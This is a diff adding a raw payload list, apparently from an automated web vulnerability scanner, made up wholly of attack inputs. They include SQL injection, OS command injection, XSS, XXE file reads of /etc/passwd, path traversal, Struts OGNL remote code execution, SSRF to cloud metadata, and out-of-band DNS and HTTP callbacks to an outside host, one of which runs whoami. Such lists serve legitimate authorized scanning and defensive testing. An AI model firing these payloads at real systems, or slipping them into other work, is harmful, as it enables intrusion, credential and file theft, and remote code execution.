@@ -1,0 +1,283 @@
+1 OR 1=1
+'
+NSSOMETHINGNO
+SOMETHING AND 'NS='ss
+SOMETHING' OR 1=1 OR 'ns'='ns
+1 OR 17-7=10
+SOMETHING OR X='ss
+SOMETHING' OR 1=1 OR '1'='1
+%27
+(select convert(int,cast(0x5f21403264696c656d6d61 as varchar(8000))) from syscolumns)
+'+ (select convert(int, cast(0x5f21403264696c656d6d61 as varchar(8000))) from syscolumns) +'
+"& SET /A 0xFFF9999-2 &
+convert(int, cast(0x5f21403264696c656d6d61 as varchar(8000)))
+'& SET /A 0xFFF9999-2 &
+'AND 1=cast(0x5f21403264696c656d6d61 as varchar(8000)) or '1'='
+& SET /A 0xFFF9999-2 &
+-1 or 1=1 and (SELECT 1 and ROW(1,1)>(SELECT COUNT(*),CONCAT(CHAR(95),CHAR(33),CHAR(64),CHAR(52),CHAR(100),CHAR(105),CHAR(108),CHAR(101),CHAR(109),CHAR(109),CHAR(97),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.COLLATIONS GROUP BY x)a)
+SET /A 0xFFF9999-2 &
+-1' and 6=3 or 1=1+(SELECT 1 and ROW(1,1)>(SELECT COUNT(*),CONCAT(CHAR(95),CHAR(33),CHAR(64),CHAR(52),CHAR(100),CHAR(105),CHAR(108),CHAR(101),CHAR(109),CHAR(109),CHAR(97),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.COLLATIONS GROUP BY x)a)+'
+SET /A 0xFFF9999-2
+-1" and 6=3 or 1=1+(SELECT 1 and ROW(1,1)>(SELECT COUNT(*),CONCAT(CHAR(95),CHAR(33),CHAR(64),CHAR(52),CHAR(100),CHAR(105),CHAR(108),CHAR(101),CHAR(109),CHAR(109),CHAR(97),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.COLLATIONS GROUP BY x)a)+"
+| SET /A 0xFFF9999-2
+' WAITFOR DELAY '0:0:25'--
+(SELECT CONCAT(CHAR(95),CHAR(33),CHAR(64),CHAR(52),CHAR(100),CHAR(105),CHAR(108),CHAR(101),CHAR(109),CHAR(109),CHAR(97)))
+SOMETHING";expr 268409241 - 2;"
+1 WAITFOR DELAY '0:0:25'--
+"& ping -n 25 127.0.0.1 &
+cast((select chr(95)||chr(33)||chr(64)||chr(53)||chr(100)||chr(105)||chr(108)||chr(101)||chr(109)||chr(109)||chr(97)) as numeric)
+SOMETHING';expr 268409241 - 2;'
+WAITFOR DELAY '0:0:25'--
+'& ping -n 25 127.0.0.1 &
+'||cast((select chr(95)||chr(33)||chr(64)||chr(53)||chr(100)||chr(105)||chr(108)||chr(101)||chr(109)||chr(109)||chr(97)) as numeric)||'
+SOMETHING;expr 268409241 - 2;x
+1) WAITFOR DELAY '0:0:25'--
+& ping -n 25 127.0.0.1 &
+(select chr(95)||chr(33)||chr(64)||chr(51)||chr(100)||chr(105)||chr(108)||chr(101)||chr(109)||chr(109)||chr(97) from DUAL)
+expr 268409241 - 2;
+') WAITFOR DELAY '0:0:25'--
+ping -n 25 127.0.0.1 &
+NSFTW
+expr 268409241 - 2
+')) WAITFOR DELAY '0:0:25'--
+"&ping -w 25 127.0.0.1 &"
+'+NSFTW+'
+<!--#exec cmd="expr 268409241 - 2"-->
+1)) WAITFOR DELAY '0:0:25'--
+'&ping -w 25 127.0.0.1 &'
+(SELECT 1 and ROW(1,1)>(SELECT COUNT(*),CONCAT(CHAR(95),CHAR(33),CHAR(64),CHAR(52),CHAR(100),CHAR(105),CHAR(108),CHAR(101),CHAR(109),CHAR(109),CHAR(97),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.COLLATIONS GROUP BY x)a)
+1));DECLARE/**/@x/**/char(9);SET/**/@x=char(48)+char(58)+char(48)+char(58)+char(50)+char(53);WAITFOR/**/DELAY/**/@x--
+&ping -w 25 127.0.0.1 &
+-1'+(SELECT 1 and ROW(1,1)>(SELECT COUNT(*),CONCAT(CHAR(95),CHAR(33),CHAR(64),CHAR(52),CHAR(100),CHAR(105),CHAR(108),CHAR(101),CHAR(109),CHAR(109),CHAR(97),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.COLLATIONS GROUP BY x)a)+'
+1;DECLARE/**/@x/**/char(9);SET/**/@x=char(48)+char(58)+char(48)+char(58)+char(50)+char(53);WAITFOR/**/DELAY/**/@x--
+ping -w 25 127.0.0.1 &
+-1\'+(select 1 and row(1,1)>(select count(*),concat(CONCAT(CHAR(95),CHAR(33),CHAR(64),CHAR(52),CHAR(100),CHAR(105),CHAR(108),CHAR(101),CHAR(109),CHAR(109),CHAR(97)),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))-- 1
+1);DECLARE/**/@x/**/char(9);SET/**/@x=char(48)+char(58)+char(48)+char(58)+char(50)+char(53);WAITFOR/**/DELAY/**/@x--
+ping -n 25 127.0.0.1
+n3tsp4rke2
+nxtspxrkex
+1 procedure analyse(extractvalue(rand(),concat(0x3a,CONCAT(CHAR(95),CHAR(33),CHAR(64),CHAR(52),CHAR(100),CHAR(105),CHAR(108),CHAR(101),CHAR(109),CHAR(109),CHAR(97)))),1)-- 1
+N3TSP4RKE2
+syscolumns WHERE 2>3;DECLARE/**/@x/**/char(9);SET/**/@x=char(48)+char(58)+char(48)+char(58)+char(50)+char(53);WAITFOR/**/DELAY/**/@x--
+ping -w 25 127.0.0.1
+(length(CTXSYS.DRITHSX.SN(user,(select chr(95)||chr(33)||chr(64)||chr(51)||chr(100)||chr(105)||chr(108)||chr(101)||chr(109)||chr(109)||chr(97) from DUAL))))
+'"--></style></scRipt><scRipt>netsparker(0x007DF4)</scRipt>
+SOMETHING + ((SELECT 1 FROM (SELECT SLEEP(25))A))/*'XOR(((SELECT 1 FROM (SELECT SLEEP(25))A)))OR'|"XOR(((SELECT 1 FROM (SELECT SLEEP(25))A)))OR"*/
+|ping -n 25 127.0.0.1
+'||CTXSYS.DRITHSX.SN(user,(select chr(95)||chr(33)||chr(64)||chr(51)||chr(100)||chr(105)||chr(108)||chr(101)||chr(109)||chr(109)||chr(97) from DUAL))||'
+%27%22--%3E%3C%2Fstyle%3E%3C%2FscRipt%3E%3CscRipt%3Enetsparker%280x007DF8%29%3C%2FscRipt%3E
+-1 AND ((SELECT 1 FROM (SELECT 2)a WHERE 1=sleep(25)))-- 1
+'+convert(int, cast(0x5f21403264696c656d6d61 as varchar(8000)))+'
+%27%22--%3E%3C%2Fstyle%3E%3C%2FscRipt%3E%3CscRipt%3Enetsparker%280x007DF9%29%3C%2FscRipt%3E
+hTTp://r87.com/n
+((select sleep(25)))a-- 1
+(select dbms_pipe.receive_message((chr(95)||chr(33)||chr(64)||chr(51)||chr(100)||chr(105)||chr(108)||chr(101)||chr(109)||chr(109)||chr(97)),25) from dual)
+data:;base64,JyI+PHNjcmlwdD5uZXRzcGFya2VyKDB4MDA3REZDKTwvc2NyaXB0Pg==
+http://r87.com/n?.php
+1' || (select dbms_pipe.receive_message((chr(95)||chr(33)||chr(64)||chr(51)||chr(100)||chr(105)||chr(108)||chr(101)||chr(109)||chr(109)||chr(97)),25) from dual) || '
+data:;base64,JyI+PHNjcmlwdD5uZXRzcGFya2VyKDB4MDA3REZEKTwvc2NyaXB0Pg==
+1 + (select dbms_pipe.receive_message((chr(95)||chr(33)||chr(64)||chr(51)||chr(100)||chr(105)||chr(108)||chr(101)||chr(109)||chr(109)||chr(97)),25) from dual) + 1
+'" ns=netsparker(0x007DFE) 
+r87.com/n
+SOMETHING';SELECT pg_sleep(25)--
+1 ns=netsparker(0x007E00) 
+SOMETHING;SELECT pg_sleep(25)--
+//r87.com/n/n.css?0x007E0A
+SELECT pg_sleep(25)--
+ns:netsparker056650=vuln
+//r87.com/n/n.css?0x007E0B
+SOMETHING);SELECT pg_sleep(25)--
+//r87.com/n/j/?0x007E0C
+SOMETHING');SELECT pg_sleep(25)--
+//r87.com/n/j/?0x007E0D
+SOMETHING'));SELECT pg_sleep(25)--
+'><net sparker=netsparker(0x007E0E)>
+SOMETHING));SELECT pg_sleep(25)--
+"><net sparker=netsparker(0x007E10)>
+((SELECT 1 FROM (SELECT SLEEP(25))A))
+<iMg src=N onerror=netsparker(0x007E12)>
+'+((SELECT 1 FROM (SELECT SLEEP(25))A))+'
+#{28275*28275-(13)}
+javascript:netsparker(0x007E14)
+-1' or 1=((SELECT 1 FROM (SELECT SLEEP(25))A))+'
+<scRipt>ns(0x007E16)</scRipt>
+-1 or 1=((SELECT 1 FROM (SELECT SLEEP(25))A))
+<%a style=x:expre/**/ssion(netsparker(0x007E18))>
+-1" or 1=((SELECT 1 FROM (SELECT SLEEP(25))A))+"
+n;ns:expression(netsparker(0x007E1A));
+<?xml version="1.0"?><!DOCTYPE ns [<!ELEMENT ns ANY><!ENTITY lfi SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">]><ns>&lfi;</ns>
+body{x:expression(netsparker(0x007E1C))}
+<?xml version="1.0"?><!DOCTYPE ns [<!ELEMENT ns ANY><!ENTITY lfi SYSTEM "file:///etc/passwd">]><ns>&lfi;</ns>
+*/netsparker(0x007E1E);/*
+'+netsparker(0x007E20)+'
+response.write(268409241-22)'
+"+netsparker(0x007E22)+"
++response.write(268409241-22)'
+\';netsparker(0x007E24);///
+t3nrv2g6uzlas0qhidoz2jddl3zpiztgt--46kaykq4.r87.me
+"+response.write(268409241-22)+"
+&#39;,netsparker(0x007E26),&#39;
+//t3nrv2g6uzvwphgcm1sn2upffatqyk8freurhimv4c4.r87.me
+http://r87.com/?SOMEDOMAIN.COM/
+<% response.write(268409241-22) %>
+ netsparker(0x007E28) 
+http://r87.me/r/?id=t3nrv2g6uzspyb7ghvjbgvcrjf99doblyjey5qdkjos
+print(int)0xFFF9999-22
+print(int)0xFFF9999-22;
+&#39;+netsparker(0x007E2C)+&#39;
+https://r87.com/?SOMEDOMAIN.COM/
++print(int)0xFFF9999-22;//
+'"@--></style></scRipt><scRipt>netsparker(0x007E2E)</scRipt>
+'+print(int)0xFFF9999-22+'
+//r87.com/?http://SOMEDOMAIN.COM/
+<html xmlns="http://www.w3.org/1999/xhtml"><script>netsparker(0x007E58)</script></html>
+"+print(int)0xFFF9999-22+"
+//r87.com/?0x007E5A
+<? print(int)0xFFF9999-22;//?>
+r87.com/?SOMEDOMAIN.COM/
+//r87.com/?0x007E5B
+{php}print(int)0xFFF9999-22;{/php}
+r87.com/?http://SOMEDOMAIN.COM/
+r87.com/?https://SOMEDOMAIN.COM/
+[php]print(int)0xFFF9999-22;[/php]
+/../../../../../../../../../../boot.ini
+%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='22').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c','SET /A 0xFFF9999 -' + #cmd}:{'/bin/bash','-c','expr 268409241 - ' + #cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
+/\r87.com/?SOMEDOMAIN.COM/
+print localtime()*0+0xFFF9999-22
+SOMETHING/../../../../../../../../../../boot.ini
+///r87.com/?SOMEDOMAIN.COM/
+eval('print localtime()*0+0xFFF9999-22')
+file:/boot.ini
+'+print localtime()*0+0xFFF9999-22+'
+<iframe src="http://r87.com/?"></iframe>
+c:\boot.ini
+<?xml version="1.0" encoding="utf-8"?><!DOCTYPE r [<!ENTITY % s "http://t3nrv2g6"><!ENTITY % d "uzymktdeyzx9xmzbltnph-dublu1h4cdyxm.r87.me"><!ENTITY % dtd SYSTEM "http://r87.me/dtd">  %dtd;]><r>&a;</r>
+"+print localtime()*0+0xFFF9999-22+"
+ns../../../../../../../../../../../boot.ini.......................................................................................................................................................................................
+SOMEDOMAIN.COM.r87.com/?
+<?xml version="1.0" encoding="utf-8"?><!DOCTYPE r [<!ENTITY % s "php://filter/resource=http://t3nrv2g6"><!ENTITY % d "uzicmxakbqcotlf--lc5z-zdbw_v9teqtxw.r87.me"><!ENTITY % dtd SYSTEM "http://r87.me/dtd">  %dtd;]><r>&a;</r>
+arguments[1].end(require('child_process').execSync('expr 268409241 - 22'))
+%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini
+<?xml version="1.0" encoding="utf-8"?><!DOCTYPE r [<!ENTITY % s "php://filter/read=convert.base64-encode/resource=http://t3nrv2g6"><!ENTITY % d "uzjmld93ghjtavjhc6bepybcsznb8lqjjt8.r87.me"><!ENTITY % dtd SYSTEM "http://r87.me/dtd">  %dtd;]><r>&a;</r>
+arguments[1].end(require('child_process').execSync('set /A 268409241 - 22'))
+http://SOMEDOMAIN.COM.r87.com/?
+file%3a%2fboot.ini
+%{#context["com.opensymphony.xwork2.dispatcher.HttpServletResponse"].addHeader("a",268409241-22)}
+c%3a%5cboot.ini
+https://SOMEDOMAIN.COM.r87.com/?
+/../../../../../../../../../../web.config
+/../../../../../../../../../../windows/win.ini
+file:/windows/win.ini
+http://t3nrv2g6uzwa4igbm1illffztm8l_eeupsuaijtotfn.r87.me/p/
+php://filter//resource=http://t3nrv2g6uz_uu_m12ehnbmdxiw08y70xog908cbs4od.r87.me/p/
+c:\windows\win.ini
+'"--></style></scRipt><scRipt src="//t3nrv2g6uzpucnojpospnfryuzwzwjjdj9qpzspawni&#46;r87&#46;me"></scRipt>
+t3nrv2g6uzmcutevxaiyiwnm1ibvh_murcmu9amo1gn.r87.me/p/
+...//...//...//...//...//...//...//...//...//...//...//windows/win.ini
+....//....//....//....//....//....//....//....//....//....//....//windows/win.ini
+.....///.....///.....///.....///.....///.....///.....///.....///.....///.....///.....///windows/win.ini
+. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /windows/win.ini
+<iMg src="//t3nrv2g6uzqzfv30clsazw75bzk5gfscdodttimbmqg&#46;r87&#46;me"/>
+/../../../../../../../../../../windows/iis6.log
+<fRame src="//t3nrv2g6uzpdtx6gtc_b8viy_hrhsw_qxnj9ztlxgbu&#46;r87&#46;me"></fRame>
+/../../../../../../../../../../proc/self/fd/2
+<scRipt src="data:;base64,bD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCJsaW5rIik7bC5yZWw9InByZWZldGNoIjtsLmhyZWY9Ii8vdDNucnYyZzZ1emxyeHd1YXBjOWZmaHJ1NzkyZnBhNG05bjM2NGNndyIrInFoOC5yODcubWUvci8/Iitsb2NhdGlvbi5ocmVmO2RvY3VtZW50LmhlYWQuYXBwZW5kQ2hpbGQobCk="></scRipt>
+";l=document.createElement("link");l.rel="prefetch";l.href="//t3nrv2g6uzcybsmmcbsorygxupzwa8ddcrbfumcs"+"nre.r87.me/r/?"+location.href;document.head.appendChild(l);//
+/../../../../../../../../../../etc/httpd/logs/error.log
+';l=document.createElement("link");l.rel="prefetch";l.href="//t3nrv2g6uzdr2r4kjdchg6shn8gaspqd87tehvsg"+"hd0.r87.me/r/?"+location.href;document.head.appendChild(l);//
+/../../../../../../../../../../etc/httpd/logs/error_log
+/../../../../../../../../../../var/log/apache2/error.log
+DECLARE @q varchar(999),@r nvarchar(999)SET @q = 'SELECT * FROM OPENROWSET(''SQLOLEDB'',''@'';''a'';''1'',''SELECT 1'')'SET @r=replace(@q,'@','t3nrv2g6uz6mxkhdwlwrm6ahc2ryygliu7imidf4'+'coy.r87.me')exec sp_executesql @r
+https://SOMEDOMAIN.COM/trace.axd
+/../../../../../../../../../../var/log/apache/error.log
+1;DECLARE @q varchar(999),@r nvarchar(999)SET @q = 'SELECT * FROM OPENROWSET(''SQLOLEDB'',''@'';''a'';''1'',''SELECT 1'')'SET @r=replace(@q,'@','t3nrv2g6uzojp8be6kyyky_jxmuhbt94zhen9fnl'+'r1g.r87.me')exec sp_executesql @r--
+SOMEDOMAIN.COM/trace.axd
+/../../../../../../../../../../proc/version
+-1';DECLARE @q varchar(999),@r nvarchar(999)SET @q = 'SELECT * FROM OPENROWSET(''SQLOLEDB'',''@'';''a'';''1'',''SELECT 1'')'SET @r=replace(@q,'@','t3nrv2g6uzsyvewjwljq5ewipvfhoabdiqidtu_r'+'o6c.r87.me')exec sp_executesql @r--
+SELECT dblink_connect('host=t3nrv2g6uzgtisvajylqbhbuiazxs8jpwkak4oed'||'ssc.r87.me user=a password=a connect_timeout=2')
+/../../../../../../../../../../../etc/passwd
+dblink_connect('host=t3nrv2g6uz1yhqnqnwsusxbetzzkk9m-esdddnph'||'trk.r87.me user=a password=a connect_timeout=2')
+cast((SELECT dblink_connect('host=t3nrv2g6uzbrxeqi_lzbwhomlhe5hmsvmpqzat4v'||'pe4.r87.me user=a password=a connect_timeout=2')) as numeric)
+file:///etc/passwd
+cast((SELECT dblink_connect(chr(104)||chr(111)||chr(115)||chr(116)||chr(61)||chr(116)||chr(51)||chr(110)||chr(114)||chr(118)||chr(50)||chr(103)||chr(54)||chr(117)||chr(122)||chr(112)||chr(45)||chr(113)||chr(119)||chr(95)||chr(54)||chr(115)||chr(52)||chr(110)||chr(109)||chr(113)||chr(100)||chr(113)||chr(101)||chr(101)||chr(118)||chr(48)||chr(120)||chr(49)||chr(118)||chr(97)||chr(105)||chr(116)||chr(105)||chr(109)||chr(120)||chr(98)||chr(112)||chr(115)||chr(107)||chr(116)||chr(100)||chr(99)||chr(46)||chr(114)||chr(56)||chr(55)||chr(46)||chr(109)||chr(101)||chr(32)||chr(117)||chr(115)||chr(101)||chr(114)||chr(61)||chr(97)||chr(32)||chr(112)||chr(97)||chr(115)||chr(115)||chr(119)||chr(111)||chr(114)||chr(100)||chr(61)||chr(97)||chr(32)||chr(99)||chr(111)||chr(110)||chr(110)||chr(101)||chr(99)||chr(116)||chr(95)||chr(116)||chr(105)||chr(109)||chr(101)||chr(111)||chr(117)||chr(116)||chr(61)||chr(50))) as numeric)
+104.20.94.38/trace.axd
+'||(SELECT dblink_connect('host=t3nrv2g6uzepvzzuqenpmayjbfwtprpbptlfu8vj'||'0za.r87.me user=a password=a connect_timeout=2'))||'
+127.100.11.2/trace.axd
+(select UTL_INADDR.GET_HOST_ADDRESS('t3nrv2g6uzk8ppqrotwhtsjsoun-poe6lyrsptr8'||'pm0.r87.me') from DUAL)
+...//...//...//...//...//...//...//...//...//...//...//etc/passwd
+::1/trace.axd
+(length(CTXSYS.DRITHSX.SN(user,(select UTL_INADDR.GET_HOST_ADDRESS('t3nrv2g6uzd9zlnz5d4mmdt1uv-2tk6dwjcqvf4t'||'9ci.r87.me') from DUAL))))
+....//....//....//....//....//....//....//....//....//....//....//etc/passwd
+127.0.0.1/trace.axd
+'||CTXSYS.DRITHSX.SN(user,(select UTL_INADDR.GET_HOST_ADDRESS('t3nrv2g6uzwacjgp-8lp-oarioh4bcsjynd9ocf6'||'6ce.r87.me') from DUAL))||'
+.....///.....///.....///.....///.....///.....///.....///.....///.....///.....///.....///etc/passwd
+gethostbyname(trim('t3nrv2g6uz3g6tzo8mvhtl6tir0fbjvsgv5_dmnv'.'8dk.r87.me'))
+https://SOMEDOMAIN.COM/elmah.axd
+(select UTL_INADDR.GET_HOST_ADDRESS(chr(116)||chr(51)||chr(110)||chr(114)||chr(118)||chr(50)||chr(103)||chr(54)||chr(117)||chr(122)||chr(104)||chr(111)||chr(121)||chr(119)||chr(45)||chr(103)||chr(111)||chr(106)||chr(116)||chr(56)||chr(118)||chr(101)||chr(98)||chr(100)||chr(105)||chr(56)||chr(118)||chr(57)||chr(50)||chr(55)||chr(120)||chr(55)||chr(99)||chr(109)||chr(51)||chr(53)||chr(104)||chr(112)||chr(99)||chr(116)||chr(53)||chr(50)||chr(121)||chr(46)||chr(114)||chr(56)||chr(55)||chr(46)||chr(109)||chr(101)) from DUAL)
+. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /etc/passwd
+gethostbyname(trim('t3nrv2g6uzihvfcstgeclzm8l8eadukpluxszwnx'.'sc8.r87.me'));
+SOMEDOMAIN.COM/elmah.axd
+(length(CTXSYS.DRITHSX.SN(user,(select UTL_INADDR.GET_HOST_ADDRESS(chr(116)||chr(51)||chr(110)||chr(114)||chr(118)||chr(50)||chr(103)||chr(54)||chr(117)||chr(122)||chr(48)||chr(118)||chr(101)||chr(102)||chr(108)||chr(50)||chr(52)||chr(51)||chr(100)||chr(101)||chr(57)||chr(53)||chr(54)||chr(50)||chr(118)||chr(101)||chr(104)||chr(105)||chr(113)||chr(99)||chr(106)||chr(112)||chr(49)||chr(98)||chr(52)||chr(113)||chr(100)||chr(117)||chr(105)||chr(55)||chr(50)||chr(119)||chr(48)||chr(46)||chr(114)||chr(56)||chr(55)||chr(46)||chr(109)||chr(101)) from DUAL))))
+SOMETHING/../../../../../../../../../../../etc/passwd
++gethostbyname(trim('t3nrv2g6uzj84rtaspeet93etg3ezjh2g7wio84i'.'eye.r87.me'));//
+'||CTXSYS.DRITHSX.SN(user,(select UTL_INADDR.GET_HOST_ADDRESS(chr(116)||chr(51)||chr(110)||chr(114)||chr(118)||chr(50)||chr(103)||chr(54)||chr(117)||chr(122)||chr(110)||chr(99)||chr(109)||chr(121)||chr(97)||chr(118)||chr(108)||chr(101)||chr(100)||chr(98)||chr(106)||chr(97)||chr(55)||chr(114)||chr(105)||chr(108)||chr(51)||chr(117)||chr(114)||chr(104)||chr(115)||chr(102)||chr(98)||chr(116)||chr(118)||chr(106)||chr(97)||chr(55)||chr(55)||chr(95)||chr(116)||chr(105)||chr(107)||chr(46)||chr(114)||chr(56)||chr(55)||chr(46)||chr(109)||chr(101)) from DUAL))||'
+/etc/passwd
+'+gethostbyname(trim('t3nrv2g6uzt0xdp4c0qo0nxps-ztnsgli0detci6'.'8m0.r87.me'))+'
+%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+"+gethostbyname(trim('t3nrv2g6uzy4zliu0by17re9fv-vhkdqve-q8eqs'.'4ds.r87.me'))+"
+data:;base64,TlM3NzU0NTYxNDQ2NTc1
+<? gethostbyname(trim('t3nrv2g6uzk0gejpihrnfvlqjxp3ypfdlobzbtgc'.'lag.r87.me'));//?>
+createobject("WScript.Shell").exec("nslookup t3nrv2g6uzw-w3lgouyfksfri_iardcfapiodq25" & "a9m.r87.me").StdOut.ReadAll
++createobject("WScript.Shell").exec("nslookup t3nrv2g6uzqfhu4nwmygos9zekses5fpfgtcqdet" & "0hu.r87.me").StdOut.ReadAll
+104.20.94.38/elmah.axd
++createobject("WScript.Shell").exec("nslookup t3nrv2g6uztegk6ioe8cuaymmawx0mpz7fuc21a1" & "mpq.r87.me").StdOut.ReadAll+
+127.100.11.2/elmah.axd
+<%createobject("WScript.Shell").exec("nslookup t3nrv2g6uz3u71mlj4mwa9qiobx6ewlbegt3cvzp" & "tei.r87.me").StdOut.ReadAll%>
+::1/elmah.axd
+"+createobject("WScript.Shell").exec("nslookup t3nrv2g6uz7frz5yxxdc4p_aw4e9jrcffiytqnpz" & "ut4.r87.me").StdOut.ReadAll+"
+127.0.0.1/elmah.axd
+gethostbyname(lc 't3nrv2g6uz3qx8p4emccqbwwk3i9ka2ncurltblc'.'bdc.r87.me')
+https://SOMEDOMAIN.COM/elmah
+eval('gethostbyname(lc 't3nrv2g6uzm7facirhn_b2ui0ggrbzyblhlc0_fq'.'vq4.r87.me')')
+SOMEDOMAIN.COM/elmah
+'+gethostbyname(lc 't3nrv2g6uz1ap4tku6_ycnr9efzhgkeybrexhcbm'.'dwq.r87.me')+'
+"+gethostbyname(lc 't3nrv2g6uztwu9zzdgfymk_nhmavf2tuxybv4gvd'.'_7u.r87.me')+"
+nslookup t3nrv2g6uzkdwrw3stc2ciqwrtwlletivt_w7mwcel0.r87.me&'\"`0&nslookup t3nrv2g6uzkdwrw3stc2ciqwrtwlletivt_w7mwcel0.r87.me&`'
+& nslookup t3nrv2g6uzn9qfjsvhgnjhcfcdqgftqjhfhwvetm_ro.r87.me&'\"`0&nslookup t3nrv2g6uzn9qfjsvhgnjhcfcdqgftqjhfhwvetm_ro.r87.me&`'
+'& nslookup t3nrv2g6uze3yqtkksuv15k4wboppkdqhq_hkrqxcss.r87.me&'\"`0&nslookup t3nrv2g6uze3yqtkksuv15k4wboppkdqhq_hkrqxcss.r87.me&`'
+"& nslookup t3nrv2g6uzjosuoupjvpwqeo3iy73ibfdmus3ynl1uo.r87.me&'\"`0&nslookup t3nrv2g6uzjosuoupjvpwqeo3iy73ibfdmus3ynl1uo.r87.me&`'
+nslookup "t3nrv2g6uzr-tmevy8e7dgye6fnaqvlt1-bcdnmm""wwq.r87.me"
+&nslookup "t3nrv2g6uzof3i5ox7v0i_5-zbbrnnabcofb7vb-""rtw.r87.me"
+104.20.94.38/elmah
+'&nslookup "t3nrv2g6uzmpe5qep0ntoop_xyvwqyya5essoq08""izs.r87.me"
+127.100.11.2/elmah
+"&nslookup "t3nrv2g6uza8fpl01okzazjw6mapyemgsys4wazq""s64.r87.me"
+::1/elmah
+127.0.0.1/elmah
+%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='nslookup `whoami`."t3nrv2g6uze6wljnfcg5tdyxm1c5r7qcupze8hh2""e6o.r87.me"').(#p=new java.lang.ProcessBuilder({'/bin/bash','-c',#cmd})).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}
+http://aws.r87.me/latest/meta-data/public-hostname
+%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='nslookup "t3nrv2g6uzlgr7d6cb7w-5bmu4wc17sphpagchon"-0e.r87.me"').(#p=new java.lang.ProcessBuilder({'cmd.exe','/c',#cmd})).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}
+http://169.254.169.254/latest/meta-data/public-hostname
+http://127.0.0.1:22
+000177.000.00000.000001/trace.axd
+0177.0.0.1/trace.axd
+0177.0.1/trace.axd
+0177.1/trace.axd
+017700000001/trace.axd
+0x7f.0.0.1/trace.axd
+http://104.20.94.38:22
+0x7f.0.1/trace.axd
+http://::1:22
+0x7f.1/trace.axd
+http://127.0.0.1:3306
+0x7f000001/trace.axd
+127.0.1/trace.axd
+127.1/trace.axd
+16777343/trace.axd
+http://104.20.94.38:3306
+000150.0024.0000136.0000046/trace.axd
+http://::1:3306
+0150.1334822/trace.axd
+https://SOMEDOMAIN.COM/server-status
+0150.20.24102/trace.axd
+0150.20.94.38/trace.axd
